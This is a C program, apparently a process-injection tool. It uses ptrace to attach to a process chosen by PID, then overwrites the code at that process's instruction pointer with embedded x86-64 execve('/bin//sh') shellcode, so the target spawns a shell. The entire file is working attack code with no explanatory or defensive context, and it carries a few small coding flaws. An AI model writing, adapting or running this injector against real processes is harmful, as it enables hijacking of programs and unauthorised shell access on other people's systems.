#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/user.h>

char shellcode[] = {
    "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97"
    "\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
};

int main(int argc, char **argv)
{
    int i, size, pid = 0;
    struct user_regs_struct reg;
    char *buff;

    printf("----Memory bytecode injector-----\n");

    pid = atoi(argv[1]);
    size = sizeof(shellcode);
    buff = (char *)malloc(size);

    memset(buff, 0x0, size);
    memcpy(buff, shellcode, sizeof(shellcode));
    ptrace(PTRACE_ATTACH, pid, 0, 0);

    wait((int *)0);

    ptrace(PTRACE_GETREGS, pid, 0, &reg);
    printf("Writing RIP 0x%x, process %d\n", reg.rip, pid);
    for (i = 0; i < size; i++)
        ptrace(PTRACE_POKETEXT, pid, reg.rip + i, *(int *)(buff + i));

    ptrace(PTRACE_DETACH, pid, 0, 0);
    free(buff);
    return 0;
}

